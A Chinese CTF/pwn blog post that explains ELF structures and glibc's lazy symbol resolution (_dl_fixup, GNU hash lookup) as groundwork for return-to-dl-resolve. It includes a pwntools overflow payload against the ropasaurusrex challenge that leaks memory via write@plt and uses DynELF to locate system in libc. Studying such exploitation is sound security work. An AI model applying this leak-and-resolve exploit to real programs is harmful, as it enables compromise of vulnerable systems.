---
title: A Trip of Symbol Resolution
date: 2020-04-06 16:04:26
tags: [ctf, pwn]
---

重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。

<!-- more -->

# Prepare

需要编译一个带调试信息的 libc，之前的博客里记录过。要在 gdb 里跟进带调试信息 ld.so 的 Makefile 如下：

```
all: a
a: a.c
        gcc a.c -o a -Wl,-dynamic-linker /path/to/install/lib/ld-2.23.so -g
```

使用 apt 安装的 gdb 在 `_dl_fixup()` 中不能单步跟，会直接略过，通过修改源码添加一个环境变量来更改 gdb 的跟进。这里以 gdb-7.11.1 为例：

```cpp
...
6501   /* If we are stepping at the source level and entered the runtime
6502      loader dynamic symbol resolution code...
6503
6504      EXEC_FORWARD: we keep on single stepping until we exit the run
6505      time loader code and reach the callee's address.
6506
6507      EXEC_REVERSE: we've already executed the callee (backward), and
6508      the runtime loader code is handled just like any other
6509      undebuggable function call.  Now we need only keep stepping
6510      backward through the trampoline code, and that's handled further
6511      down, so there is nothing for us to do here.  */
6512
6513   static int env_debug_resolver = -1;
6514   if (env_debug_resolver == -1) {
6515     char *env_debug_resolver_str = getenv("DEBUG_RESOLVER");
6516     if (env_debug_resolver_str && !strcmp(env_debug_resolver_str, "1")) {
6517       env_debug_resolver = 1;
6518     } else {
6519       env_debug_resolver = 0;
6520     }
6521   }
6522   if (execution_direction != EXEC_REVERSE
6523       && ecs->event_thread->control.step_over_calls == STEP_OVER_UNDEBUGGABLE
6524       && env_debug_resolver == 0
6525       && in_solib_dynsym_resolve_code (stop_pc))
6526     {
6527       CORE_ADDR pc_after_resolver =
6528         gdbarch_skip_solib_resolver (gdbarch, stop_pc);
...
```

生成 Makefile 时必须添加 `--enable-tui` 才会有 layout 的界面（编译的时候使用系统默认 python 版本，如果需要 pwndbg、gef 之类的插件就必须用 python3）：

```bash
../configure --enable-tui --with-python=/usr/bin/python2.7
```

如果在最后安装 gdb 的时候出现 `makeinfo: not found`，只需要装个 `texinfo` 即可：

```bash
/home/b3ale/gdb-7.11.1/missing: 81: /home/b3ale/gdb-7.11.1/missing: makeinfo: not found
WARNING: 'makeinfo' is missing on your system.
         You should only need it if you modified a '.texi' file, or
         any other file indirectly affecting the aspect of the manual.
         You might want to install the Texinfo package:
         <http://www.gnu.org/software/texinfo/>
         The spurious makeinfo call might also be the consequence of
         using a buggy 'make' (AIX, DU, IRIX), in which case you might
         want to install GNU make:
         <http://www.gnu.org/software/make/>
Makefile:503: recipe for target 'gdb.info' failed
make[5]: *** [gdb.info] Error 127
make[5]: Leaving directory '/home/b3ale/gdb-7.11.1/build/gdb/doc'
Makefile:1505: recipe for target 'subdir_do' failed
make[4]: *** [subdir_do] Error 1
make[4]: Leaving directory '/home/b3ale/gdb-7.11.1/build/gdb'
Makefile:1240: recipe for target 'install-only' failed
make[3]: *** [install-only] Error 2
make[3]: Leaving directory '/home/b3ale/gdb-7.11.1/build/gdb'
Makefile:1237: recipe for target 'install' failed
make[2]: *** [install] Error 2
make[2]: Leaving directory '/home/b3ale/gdb-7.11.1/build/gdb'
Makefile:9185: recipe for target 'install-gdb' failed
make[1]: *** [install-gdb] Error 2
make[1]: Leaving directory '/home/b3ale/gdb-7.11.1/build'
Makefile:2248: recipe for target 'install' failed
make: *** [install] Error 2
```

在需要调试 `_dl_fixup()` 时只需要 export 一个环境变量即可：

```bash
export DEBUG_RESOLVER=1
```

对于没有链接带符号 ld 的程序，可以在本地做一个软链接，然后把程序中 ld 对应的字符串替换掉（以 32 位为例）：

```bash
sed -i s/ld-linux.so.2/LD-linux.so.2/g ./binary
```

# How DynELF Works?

在 pwntools 中有一个工具叫 DynELF，可以通过一个任意内存读的漏洞来对获取 libc 以及解析出 libc 中任何函数的地址。它的原理跟 ELF 的相关结构有关，下面先来看看怎么使用 DynELF。

## PlaidCTF-2013-ropasaurusrex

以 PlaidCTF 2013 中的 ropasaurusrex 为例。程序很简单，明显有溢出：

```cpp
ssize_t __cdecl main()
{
  vul();
  return write(1, "WIN\n", 4u);
}

ssize_t vul()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```

通过溢出可以修改返回地址为 `start`，来构造无限次输入；同时可以跳 `write` 来泄漏信息。能构造出如下的 leak 函数，每次可以泄漏指定地址上的 4 个字节的数据：

```python
elf = ELF('./ropasaurusrex')

write_plt = elf.plt['write']
start_addr = 0x8048340

def leak(addr):
    payload = flat(
        'A' * 140,
        write_plt,
        start_addr,
        1,
        addr,
        4
    )
    p.sendline(payload)
    data = p.recv(4)
    info(hex(addr) + ' ==> ' + data)
    return data
```

使用 DynELF 指定开始泄漏的地址，可以把 libc 的基址泄漏出来：

```python
#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrex
prog = DynELF(leak, 0x8048000)
bases = prog.bases()
info(bases)
for l in bases:
	if 'libc.so.6' in l:
		ptr = bases[l]
info('ptr => ' + hex(ptr))
```

然后从 libc 基址开始使用 DynELF 找到 `system` 和 `read` 的地址：

```python
libc = DynELF(leak, ptr)
system_addr = libc.lookup('system')
read_addr = libc.lookup('read')
```

## Lazy Symbol Binding

接下来慢慢解释 DynELF 是怎么实现的。先要了解延迟绑定这一概念。在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定：

- 程序启动时，外部函数的地址未知（比如说在 libc 中的函数）
- 只有动态链接的程序需要解析函数地址，静态链接的程序不需要
- 函数第一次被调用时，通过 Dynamic Resolver 来计算函数的地址，并在 GOT 上做好重定位

## ELF Structure

接下来了解一下 ELF 文件的结构。结构体在 [`glibc/elf/elf.h`](https://code.woboq.org/userspace/glibc/elf/elf.h.html) 中。

笼统地来说，ELF 包括 ELF Header、Program Header Table、Section（Segment）、Section Header Table 几个部分。在程序执行前和执行时，ELF 的结构是不同的。在程序执行前，ELF Header 中存储了 Section Header Table 的位置，而 Section Header Table 中又存储了每个 Section 的位置；在程序执行时，一个或多个 Section 会被映射到一个 Segment 中，ELF Header 中存储了 Program Header Table 的位置，而 Program Header Table 中存储了各个 Segment 的地址：

```
             Linking View                        Execution View
       +----------------------+             +----------------------+
       |      ELF Header      |  ---+ +---  |      ELF Header      |
       |----------------------|     | |     |----------------------|
       | Program Header Table |     | +---> | Program Header Table |  ---+
       |      (optional)      |     |       |----------------------|     |
       |----------------------|     |       |                      |     |
 +---> |      Section 1       | ----|-----> |      Segment 1       | <---|
 |     |----------------------|     | |     |                      |     |
 |     |         ...          | ----|-+     |----------------------|     |
 |     |----------------------|     |       |                      |     |
 |---> |      Section n       | ----|-----> |      Segment 2       | <---+
 |     |----------------------|     | |     |                      |
 |     |         ...          | ----|-+     |----------------------|
 |     |----------------------|     |       | Section Header Table |
 +---  | Section Header Table | <---+       |      (optional)      |
       +----------------------+             +----------------------+
```

几个部分大概的描述如下：

- Section（节区）：存放代码和数据的一块连续内存（例：.text、.data、.bss、.got）
  - `objdump -j .got.plt -s ./`
- Segment（段）：包含多个 Section 的连续内存
- Program Header Table 描述 Section 和 Segment 的对应关系，不一定所有的 Section 都会有映射，所以 Section 中的数据不一定全部出现在内存中

ELF Header 中，`e_ident` 存储了 Magic Number 即 `"\x7fELF"`，`e_machine` 即程序对应的架构，`e_entry` 存储了程序的入口点，`e_phoff` 和 `e_shoff` 分别存储了 Program Header Table 和 Section Header Table 的偏移，`e_phentsize` 和 `e_shentsize` 分别存储了 Program Header Table 和 Section Header Table 的结构体大小，`e_phnum` 和 `e_shnum` 分别存储了 Program Header Table 和 Section Header Table 中 Header 的数量：

```cpp
typedef struct
{
  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */
  Elf32_Half        e_type;                        /* Object file type */
  Elf32_Half        e_machine;                /* Architecture */
  Elf32_Word        e_version;                /* Object file version */
  Elf32_Addr        e_entry;                /* Entry point virtual address */
  Elf32_Off        e_phoff;                /* Program header table file offset */
  Elf32_Off        e_shoff;                /* Section header table file offset */
  Elf32_Word        e_flags;                /* Processor-specific flags */
  Elf32_Half        e_ehsize;                /* ELF header size in bytes */
  Elf32_Half        e_phentsize;                /* Program header table entry size */
  Elf32_Half        e_phnum;                /* Program header table entry count */
  Elf32_Half        e_shentsize;                /* Section header table entry size */
  Elf32_Half        e_shnum;                /* Section header table entry count */
  Elf32_Half        e_shstrndx;                /* Section header string table index */
} Elf32_Ehdr;
typedef struct
{
  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */
  Elf64_Half        e_type;                        /* Object file type */
  Elf64_Half        e_machine;                /* Architecture */
  Elf64_Word        e_version;                /* Object file version */
  Elf64_Addr        e_entry;                /* Entry point virtual address */
  Elf64_Off        e_phoff;                /* Program header table file offset */
  Elf64_Off        e_shoff;                /* Section header table file offset */
  Elf64_Word        e_flags;                /* Processor-specific flags */
  Elf64_Half        e_ehsize;                /* ELF header size in bytes */
  Elf64_Half        e_phentsize;                /* Program header table entry size */
  Elf64_Half        e_phnum;                /* Program header table entry count */
  Elf64_Half        e_shentsize;                /* Section header table entry size */
  Elf64_Half        e_shnum;                /* Section header table entry count */
  Elf64_Half        e_shstrndx;                /* Section header string table index */
} Elf64_Ehdr;
```

Section Header Table 是一个 `Elf64_Shdr`（`Elf32_Shdr`）的数组（程序执行时一般没有 Section Header Table），指出每个 Section 的地址：

```cpp
/* Section header.  */
typedef struct
{
  Elf32_Word        sh_name;                /* Section name (string tbl index) */
  Elf32_Word        sh_type;                /* Section type */
  Elf32_Word        sh_flags;                /* Section flags */
  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */
  Elf32_Off        sh_offset;                /* Section file offset */
  Elf32_Word        sh_size;                /* Section size in bytes */
  Elf32_Word        sh_link;                /* Link to another section */
  Elf32_Word        sh_info;                /* Additional section information */
  Elf32_Word        sh_addralign;                /* Section alignment */
  Elf32_Word        sh_entsize;                /* Entry size if section holds table */
} Elf32_Shdr;
typedef struct
{
  Elf64_Word        sh_name;                /* Section name (string tbl index) */
  Elf64_Word        sh_type;                /* Section type */
  Elf64_Xword        sh_flags;                /* Section flags */
  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */
  Elf64_Off        sh_offset;                /* Section file offset */
  Elf64_Xword        sh_size;                /* Section size in bytes */
  Elf64_Word        sh_link;                /* Link to another section */
  Elf64_Word        sh_info;                /* Additional section information */
  Elf64_Xword        sh_addralign;                /* Section alignment */
  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */
} Elf64_Shdr;
```

Program Header Table 是一个 `Elf64_Phdr`（`Elf32_Phdr`）的数组，指定数据以及其在内存中的位置，即某个范围会被加载到哪个地址（Segment 包含多个 Section）：

```cpp
/* Program segment header.  */
typedef struct
{
  Elf32_Word        p_type;                        /* Segment type */
  Elf32_Off        p_offset;                /* Segment file offset */
  Elf32_Addr        p_vaddr;                /* Segment virtual address */
  Elf32_Addr        p_paddr;                /* Segment physical address */
  Elf32_Word        p_filesz;                /* Segment size in file */
  Elf32_Word        p_memsz;                /* Segment size in memory */
  Elf32_Word        p_flags;                /* Segment flags */
  Elf32_Word        p_align;                /* Segment alignment */
} Elf32_Phdr;
typedef struct
{
  Elf64_Word        p_type;                        /* Segment type */
  Elf64_Word        p_flags;                /* Segment flags */
  Elf64_Off        p_offset;                /* Segment file offset */
  Elf64_Addr        p_vaddr;                /* Segment virtual address */
  Elf64_Addr        p_paddr;                /* Segment physical address */
  Elf64_Xword        p_filesz;                /* Segment size in file */
  Elf64_Xword        p_memsz;                /* Segment size in memory */
  Elf64_Xword        p_align;                /* Segment alignment */
} Elf64_Phdr;
```

### Dynamic Section

`.dynamic` 是一个 `Elf64_Dyn`（`Elf32_Dyn`）数组，是解析 Symbol 时最重要的一个 Section。执行时可以根据 Program Header Table，找出 `p_type` 值为 `PT_DYNAMIC` 的 Program Header。Program Header Table 的基址加上 `p_offset` 的结果就是 `.dynamic` 的地址。其中的 `union` 里用 `d_val` 还是 `d_ptr` 取决于 `d_tag`（`DT_xxx`）：

```cpp
/* Dynamic section entry.  */
typedef struct
{
  Elf32_Sword        d_tag;                        /* Dynamic entry type */
  union
    {
      Elf32_Word d_val;                        /* Integer value */
      Elf32_Addr d_ptr;                        /* Address value */
    } d_un;
} Elf32_Dyn;
typedef struct
{
  Elf64_Sxword        d_tag;                        /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;                /* Integer value */
      Elf64_Addr d_ptr;                        /* Address value */
    } d_un;
} Elf64_Dyn;
```

#### `.dynsym`

`.dynsym` 是 `.dynamic` 中 `d_tag` 为 `DT_SYMTAB` 的 entry，`d_ptr` 指向 `.dynsym` Section（`Elf64_Sym` 或 `Elf32_Sym` 数组）。其中 `st_name` 指向 Symbol Name：

```cpp
/* Symbol table entry.  */
typedef struct
{
  Elf32_Word        st_name;                /* Symbol name (string tbl index) */
  Elf32_Addr        st_value;                /* Symbol value */
  Elf32_Word        st_size;                /* Symbol size */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char        st_other;                /* Symbol visibility */
  Elf32_Section        st_shndx;                /* Section index */
} Elf32_Sym;
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char st_other;                /* Symbol visibility */
  Elf64_Section        st_shndx;                /* Section index */
  Elf64_Addr        st_value;                /* Symbol value */
  Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
```

#### `.dynstr`

`.dynstr` 是 `.dynamic` 中 `d_tag` 为 `DT_STRTAB` 的 entry，是 `.dynsym` 中 `st_name` 对应的字符串表（`name = (char *)(.dynstr+.dynsym[xx]->st_name)`）。

#### `.rel.plt`（`.rela.plt`）

`.rel.plt`（`.rela.plt`）是 `.dynamic` 中 `d_tag` 为 `DT_JMPREL` 的 entry，对应的结构体是 `Elf64_Rela`（`Elf32_Rel`）。`XX_Rela` 相比 `XX_Rel` 多了一个没什么用处的 `r_addend`，测试的时候发现 32 位程序用的是 `Elf32_Rel`，而 64 位程序用的是 `Elf64_Rela`。`r_offset` 为需要重定位的地址的偏移，即 `.got.plt`（GOT）；`r_info` 中包含 Symbol Index（Symbol Index 即为 `.dynsym` 中的 Section Index）。`ELF64_R_SYM`（`#define ELF64_R_SYM(i) ((i) >> 32)`）用来取高 32bit；`ELF32_R_SYM`（`#define ELF32_R_SYM(val) ((val) >> 8)`）用来取高 24bit：

```cpp
/* Relocation table entry without addend (in section of type SHT_REL).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                        /* Relocation type and symbol index */
} Elf32_Rel;
/* I have seen two different definitions of the Elf64_Rel and
   Elf64_Rela structures, so we'll leave them out until Novell (or
   whoever) gets their act together.  */
/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
} Elf64_Rel;
/* Relocation table entry with addend (in section of type SHT_RELA).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                        /* Relocation type and symbol index */
  Elf32_Sword        r_addend;                /* Addend */
} Elf32_Rela;
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
```

## Symbol Resolve

接下来看程序是怎么解 Symbol 的。在 Symbol 还没有没解析好的时候，PLT 中的第一条指令会 JMP 到 GOT，而 GOT 原本的值是 PLT 中的第二条指令（`XX@plt+6`）；第二条指令 `PUSH reloc_arg`（如果用 `.rel.plt` 则 `reloc_arg` 是 `offset`；如果是 `rela.plt.` 则是 `index`）；第三条指令 JMP 至 PLT 中的第一行（`PLT0`）。

接下来在 `PLT0` 中，第一条指令 `PUSH GOT1` 把 `link_map` 结构体入栈（64 位在调用 `_dl_fixup()` 之前会把栈上的 `link_map` 和 `reloc_arg` 分别复制给 rdi 和 rsi）；第二条指令 `JMP GOT2` 来跳转到 Dynamic Resolver 来寻找 Symbol（即跳转到 `_dl_runtime_resolve()`）

### `_dl_runtime_resolve()`

`_dl_runtime_resolve()` 函数是 Symbol 的解析器，它将 `link_map` 和 `reloc_arg` 作为参数传入 `_dl_fixup()`，并在 `_dl_fixup()` 中获取 Symbol Name，在 Library 中找到对应的地址并填入 GOT。解析成功后，程序会直接跳转到解出的函数地址。

Resolver 先根据 reloc_arg 定位到 `.rel.plt`（`.rela.plt`），然后根据 `r_info` 找到对应的 Symbol Name，并获取在 Library 中的地址，然后根据 `r_offset` 找到 GOT，并将获得的地址填入 GOT。查找函数的过程如下：

```
_dl_runtime_resolve(link_map, reloc_arg)
            __________            |
           |Elf64_Rela| <---------+
           |----------|
      +--- | r_offset |         ___________
      |    |  r_info  | -----> | Elf64_Sym |          ____________
      |    |__________|        |-----------|         |            |
      |                        |  st_name  | ------> | printf\x00 |
      |      .rel.plt          |___________|         |____________|
      v
  __________                     .dynsym                .dynstr
 |          |
 | <printf> |
 |__________|

   .got.plt
```

其中 `link_map` 中包括了所有已加载的 ELF 信息。

#### `link_map`

`link_map` 结构体在 [`glibc/include/link.h`](https://code.woboq.org/userspace/glibc/include/link.h.html) 中实现。其中，`l_next` 作为指针连接所有载入的 Library；`l_name` 存储了 Library 的名字；`l_addr` 中存储了该 Library 的基址；`l_info[x]` 则指向 `.dynamic` 中的数据，`x` 即为 `d_tag`，可以用来获取 Library 中的指定 Section：

```cpp
/* Structure describing a loaded shared object.  The `l_next' and `l_prev'
   members form a chain of all the shared objects loaded at startup.
   These data structures exist in space used by the run-time dynamic linker;
   modifying them may have disastrous results.
   This data structure might change in future, if necessary.  User-level
   programs must avoid defining objects of this type.  */
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    ElfW(Addr) l_addr;                /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;                /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;
    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */
    ElfW(Addr) l_entry;                /* Entry point location.  */
    ElfW(Half) l_phnum;                /* Number of program header entries.  */
    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */
    ...
    /* Pointer to the version information if available.  */
    ElfW(Versym) *l_versyms;
    ...
  };
```

#### `_dl_fixup()`

`_dl_fixup()` 在 [dl-runtime.c](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html) 中实现。通过 `reloc_arg` 在 `link_map` 中获取相应的 `symtab`（`.dynsym` 数组）、`strtab`（`.dynstr`）、`reloc`（`.rel.plt` 或 `.rela.plt`）、`sym`（根据 `reloc` 中的 `r_info` 得到对应的 `.dynsym` 元素）。然后会有一系列的检查，通过检查后根据 `strtab + sym->st_name` 的 Symbol Name 查找到对应的地址，最后填入 GOT：

```cpp
/* This function is called through a special trampoline from the PLT the
   first time each PLT entry is called.  We must perform the relocation
   specified in the PLT of the given shared object, and return the resolved
   function address to the trampoline, which will restart the original call
   to that address.  Future calls will bounce directly from the PLT to the
   function.  */

DL_FIXUP_VALUE_TYPE
__attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	   struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  // 通过reloc_arg计算重定位入口，JMPREL即.rel.plt，reloc_offset在32位下为reloc_arg（64位下为reloc_arg * sizeof (PLTREL)）
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  // 通过reloc->r_info找到.dynsym中对应的部分
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  // 检查reloc->r_info的最低位是不是ELF_MACHINE_JMP_SLOT（7，表示这是一个PLT）
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

  // 检查version
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}

      /* We need to keep the scope around so do some locking.  This is
	 not necessary for objects which cannot be unloaded or when
	 we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
	{
	  THREAD_GSCOPE_SET_FLAG ();
	  flags |= DL_LOOKUP_GSCOPE_LOCK;
	}

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
      // 通过strtab + sym->st_name找到符号表字符串，result为libc基地址
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
	THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif

      // 找到了对应的.dynsym后，Library基址加上st_value的结果即为函数地址
      value = DL_FIXUP_MAKE_VALUE (result,
				   sym ? (LOOKUP_VALUE_ADDRESS (result)
					  + sym->st_value) : 0);
    }
  else
    {
      // 如果Symbol已经找到了
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }
  // value为libc基址加上要解析函数的偏移地址，即实际地址
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* Finally, fix up the plt itself.  */
  if (__builtin_expect (GLRO(dl_bind_not), 0))
    return value;
  // 把value写入对应的GOT中
  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```

##### `_dl_lookup_symbol_x()`（`_dl_lookup_x()`）

`_dl_lookup_symbol_x()` 以及 `_dl_lookup_x()` 在 [`glibc/elf/dl-look-up.c`](https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html) 中实现。其中根据 `strtab + sym->st_name` 来查找符号表。理论上可以通过遍历 `.dynsym` 中的每个元素的 `st_name` 来获取 `.dynstr` 中对应的字符串，并和传入的 Symbol Name 进行比较，但这样的时间复杂度就会很高。`_dl_lookup_symbol_x()` 中则通过哈希表（GNU Hash）来进行查找：

```cpp
static uint_fast32_t
dl_new_hash (const char *s)
{
  uint_fast32_t h = 5381;
  for (unsigned char c = *s; c != '\0'; c = *++s)
    h = h * 33 + c;
  return h & 0xffffffff;
}
```

可以用 Python 实现这个函数：

```python
In [1]: def dl_new_hash(s):
   ...:   h = 5381
   ...:   for c in s:
   ...:     h = 33 * h + ord(c)
   ...:   return h & 0xffffffff
   ...:

In [2]: hex(dl_new_hash('__isoc99_scanf'))
Out[2]: '0xeafe348dL'
```

`_dl_lookup_symbol_x()` 中，先会调用 `dl_new_hash()` 来计算 Symbol Name 的哈希值，然后调用 `do_lookup_x()` 来查找对应的 Symbol：

```cpp
/* Search loaded objects' symbol tables for a definition of the symbol
   UNDEF_NAME, perhaps with a requested version for the symbol.

   We must never have calls to the audit functions inside this function
   or in any function which gets called.  If this would happen the audit
   code might create a thread which can throw off all the scope locking.  */
lookup_t
internal_function
_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,
		     const ElfW(Sym) **ref,
		     struct r_scope_elem *symbol_scope[],
		     const struct r_found_version *version,
		     int type_class, int flags, struct link_map *skip_map)
{
  const uint_fast32_t new_hash = dl_new_hash (undef_name); // 获取Symbol Name的哈希
  unsigned long int old_hash = 0xffffffff;
  struct sym_val current_value = { NULL, NULL };
  struct r_scope_elem **scope = symbol_scope;

  ...

  /* Search the relevant loaded objects for a definition.  */
  for (size_t start = i; *scope != NULL; start = 0, ++scope)
    {
      int res = do_lookup_x (undef_name, new_hash, &old_hash, *ref,
			     &current_value, *scope, start, version, flags,
			     skip_map, type_class, undef_map);
      if (res > 0)
	break;

  ...

  *ref = current_value.s;
  return LOOKUP_VALUE (current_value.m);
}
```

在 `do_lookup_x()` 中有一个大循环，主要是根据 Symbol Name 的哈希值模 `l_nbuckets` 作为下标，从 `l_gnu_buckets` 中获取一个 `bucket`。然后根据 bucket 从 `l_gnu_chain_zero` 取出一个哈希值来进行比较，如果正确，那么当前的 `bucket` 的值就是目标 `.dynsym` 的下标；如果不正确，将 `bucket` 的值加 1。最后返回 Symbol Name 对应的 `.dynsym`：

```cpp
/* Inner part of the lookup functions.  We return a value > 0 if we
   found the symbol, the value 0 if nothing is found and < 0 if
   something bad happened.  */
static int
__attribute_noinline__
do_lookup_x (const char *undef_name, uint_fast32_t new_hash,
	     unsigned long int *old_hash, const ElfW(Sym) *ref,
	     struct sym_val *result, struct r_scope_elem *scope, size_t i,
	     const struct r_found_version *const version, int flags,
	     struct link_map *skip, int type_class, struct link_map *undef_map)
{
  size_t n = scope->r_nlist;
  /* Make sure we read the value before proceeding.  Otherwise we
     might use r_list pointing to the initial scope and r_nlist being
     the value after a resize.  That is the only path in dl-open.c not
     protected by GSCOPE.  A read barrier here might be to expensive.  */
  __asm volatile ("" : "+r" (n), "+m" (scope->r_list));
  struct link_map **list = scope->r_list;

  do
    {
  ...

      /* The tables for this map.  */
      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);
      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);

  ...
      if (__builtin_expect (bitmask != NULL, 1))
	{
	  ElfW(Addr) bitmask_word
	    = bitmask[(new_hash / __ELF_NATIVE_CLASS)
		      & map->l_gnu_bitmask_idxbits];

	  unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
	  unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift)
				   & (__ELF_NATIVE_CLASS - 1));

	  if (__builtin_expect ((bitmask_word >> hashbit1)
				& (bitmask_word >> hashbit2) & 1, 0))
	    {
        // 从l_gnu_buckets中获取一个bucket
	      Elf32_Word bucket = map->l_gnu_buckets[new_hash
						     % map->l_nbuckets];
	      if (bucket != 0)
		{
      // 从l_gnu_chain_zero取出一个哈希值
		  const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];

		  do
		    if (((*hasharr ^ new_hash) >> 1) == 0) // 比较哈希值
		      {
			symidx = hasharr - map->l_gnu_chain_zero;
			sym = check_match (&symtab[symidx]);
			if (sym != NULL)
			  goto found_it;
		      }
		  while ((*hasharr++ & 1u) == 0);
		}
	    }
	  /* No symbol found.  */
	  symidx = SHN_UNDEF;
	}
  ...
    }

  /* We have not found anything until now.  */
  return 0;
}
```

## Conclusion

根据上面的分析，基本上可以得出 Dynamic Resolver 进行解析 Symbol 的过程：

- 根据 `reloc_arg` 加载 Symbol Name
- 根据 `link_map` 中依次在每个 Library 中找 Symbol
- 计算 Symbol 的 Hash
- 用 Bloom Filter 检查 Symbol 是否存在（不是很重要）
- 在 Hash Bucket 和 Chain 中找 Symbol，若 `st_name` 符合则找到
- 检查 `version` 是否正确（不太重要）
- 填写 GOT 并回传 Symbol 的地址

而 DynELF 的功能其实就是在干 Dynamic Resolver 的工作，它没有采用 GNU Hash 的方法来查找，而是使用了一个一个找 `.dynsym` 的方式来定位想要的函数。

# Return to Dynamic Resolver

